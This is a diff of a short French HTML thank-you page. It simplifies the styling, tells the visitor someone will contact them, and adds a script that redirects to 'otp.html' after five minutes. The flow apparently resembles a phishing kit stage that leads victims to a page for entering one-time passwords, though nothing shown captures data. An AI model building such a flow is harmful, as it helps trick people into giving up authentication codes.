@@ -1,45 +1,16 @@
 <!DOCTYPE html>
 <html lang="fr">
-<head>
-  <meta charset="UTF-8" />
-  <title>Merci !</title>
-  <style>
-    body {
-      margin: 0;
-      padding: 0;
-      background: linear-gradient(135deg, #1a0033, #2c014d);
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      color: white;
-      height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      text-align: center;
-      padding: 20px;
-    }
-    .message-box {
-      background: rgba(44, 1, 77, 0.9);
-      border: 2px solid #a54ffb;
-      border-radius: 20px;
-      padding: 40px 30px;
-      max-width: 400px;
-      box-shadow: 0 0 20px #a54ffb;
-    }
-    h1 {
-      font-size: 32px;
-      margin-bottom: 20px;
-    }
-    p {
-      font-size: 18px;
-      line-height: 1.5;
-      margin: 0;
-    }
-  </style>
+<head><meta charset="UTF‑8"><title>Merci</title>
+<style>
+  body{background:#2c014d;color:white;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
+  .c{background:rgba(44,1,77,0.85);padding:30px;border-radius:20px;width:360px;text-align:center}
+</style>
 </head>
 <body>
-  <div class="message-box">
-    <h1>Merci !</h1>
-    <p>Une personne vous contactera bientôt.</p>
+  <div class="c">
+    <h1>Merci pour votre participation !</h1>
+    <p>Une personne vous contactera bientôt.<br>Veuillez patienter…</p>
   </div>
+<script>setTimeout(()=>location='otp.html',5*60*1000);</script>
 </body>
 </html>
